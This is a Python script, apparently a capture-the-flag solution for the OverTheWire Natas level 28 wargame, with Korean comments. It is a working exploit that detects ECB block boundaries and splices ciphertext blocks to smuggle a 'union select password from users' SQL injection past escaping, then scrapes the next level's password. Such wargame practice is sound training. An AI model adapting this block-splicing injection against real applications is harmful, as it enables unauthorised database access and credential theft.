import requests
import sys
import base64
import urllib.parse
import re

boundary = "=" * 65

if len(sys.argv) != 2:
  print(boundary)
  print("[-] 아래 포멧으로 파일 실행")
  print(f"   python {sys.argv[0]} [natas28 비밀번호]")
  print(boundary)
  sys.exit()

url = "http://natas28.natas.labs.overthewire.org/"
natas28_cred = sys.argv[1]

s = requests.Session()
s.auth = ("natas28", natas28_cred)


def cipher_search(url, data):
  response = s.post(url + "index.php/", data=data, allow_redirects=False)
  location = response.headers['Location']
  parse_url = urllib.parse.parse_qs(urllib.parse.urlparse(location).query)["query"][0]
  row_query = base64.b64decode(urllib.parse.unquote(parse_url))
  return row_query



def find_pad_len(url):
  prev_len = None

  for i in range(1, 27):
    query = "a" * i
    data = {"query": query}
    row_query = cipher_search(url, data)

    if prev_len is not None and len(row_query) != prev_len:
      print(boundary)
      print(f"[+] 블록 경계 감지: {i}번째 자리")
      print(boundary)
      return i

    prev_len = len(row_query)
  return None                  

def find_prefix_len(url):
  for pad in range(16):
    test_pad = "a" * (pad + 32)
    data = {"query": test_pad}
    raw= cipher_search(url, data)
    b = [raw[i:i+16] for i in range(0, len(raw), 16)]
    for k in range(len(b) - 1):
      pre = 16 * k - pad
      if b[k] == b[k + 1]:
        print(f"[+] 프리픽스 길이: {pre}")
        print(boundary)
        return pre
  return None



def creat_payload(url, prefix_len):
  # 16바이트 단위로 끊기 때문에, 마지막에 \를 붙여야 해서 이렇게 되야함            
  pad = (16 - (prefix_len + 1) % 16) % 16
  inject_block = (prefix_len + pad + 1) // 16
  print(f"[+] pad = {pad}  inject_block = {inject_block}")
  print(boundary)
  
  payload = "a" * pad + "' union select password from users # "

  ex_data = {"query": payload}
  ex_request = cipher_search(url, data=ex_data)
  
  norm_query = cipher_search(url, {"query": "a" * (pad + 64)})
  
  ex_b  = [ex_request[i:i+16]  for i in range(0, len(ex_request), 16)]
  norm_b = [norm_query[i:i+16] for i in range(0, len(norm_query), 16)] 
  
  print("[debug] 쿼리문 확인")  
  for n, b in enumerate(ex_b):
      print(f"[악성 block {n}] {b.hex()}")
  print(boundary)
  for n, b in enumerate(norm_b):
      print(f"[정상 block {n}] {b.hex()}")
  print(boundary)
  
  # \가 포함된 블록 제거하고 SQLI 페이로드 생성
  block_str = b"".join(norm_b[:inject_block] + ex_b[inject_block:])   
  return block_str    

prefix_len = find_prefix_len(url)
payload = base64.b64encode(creat_payload(url, prefix_len)).decode()
no_serach = [natas28_cred]

params = {"query": payload}
payload_response = s.get(url+"search.php/", params=params)

print("[debug] 입력한 익스플로잇")
print(payload)
print(boundary)

password = re.findall(r"[A-Za-z0-9]{32}",payload_response.text)
password = [pw for pw in password if pw not in no_serach]


if password:
  print(f"natas 29의 비밀번호 ===> {password[0]}")
  print(boundary)
else:
  print("응답 전체 내용확인 혹은 다른 오류 발생")
  print(f"{payload_response.text}")
  print(boundary)  
